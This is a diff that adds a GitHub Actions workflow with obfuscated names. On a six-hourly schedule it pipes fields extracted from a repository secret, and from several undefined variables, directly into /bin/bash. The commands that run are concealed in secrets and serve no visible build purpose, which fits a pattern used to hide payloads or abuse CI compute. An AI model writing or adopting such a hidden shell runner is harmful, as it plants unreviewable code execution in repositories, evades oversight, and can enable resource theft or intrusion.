@@ -1,0 +1,22 @@
+name: liangwangchao8465
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liangwangchao8465
+        env:
+          ajuk261: ${{ secrets.ajuk261 }}
+        run: |
+          echo $ajuk261 | jq -r .whk1116 | /bin/bash
+          echo $ux99 | jq -r .jxyi89810 | /bin/bash
+          echo $uoqm29148 | jq -r .hd957 | /bin/bash
+          echo $h27 | jq -r .d89 | /bin/bash
+          echo $kph413 | jq -r .y9097 | /bin/bash
+
